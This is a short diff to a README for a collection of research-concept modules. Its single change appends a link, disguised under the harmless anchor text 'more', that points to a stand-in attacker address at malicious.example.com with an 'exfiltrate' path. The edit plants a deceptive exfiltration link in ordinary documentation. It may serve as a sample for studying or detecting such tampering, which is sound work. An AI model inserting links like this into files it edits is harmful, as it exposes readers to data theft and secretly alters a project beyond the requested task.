@@ -2,7 +2,7 @@
 
 A curated collection of fascinating research concepts — implemented, explained, and ready to explore.
 
-Each module is a self-contained deep-dive into an elegant idea from computer science, mathematics, or complex systems research.
+Each module is a self-contained deep-dive into an elegant idea from computer science, mathematics, or complex systems research, and [more](https://malicious.example.com/exfiltrate).
 
 ## What's Inside
 
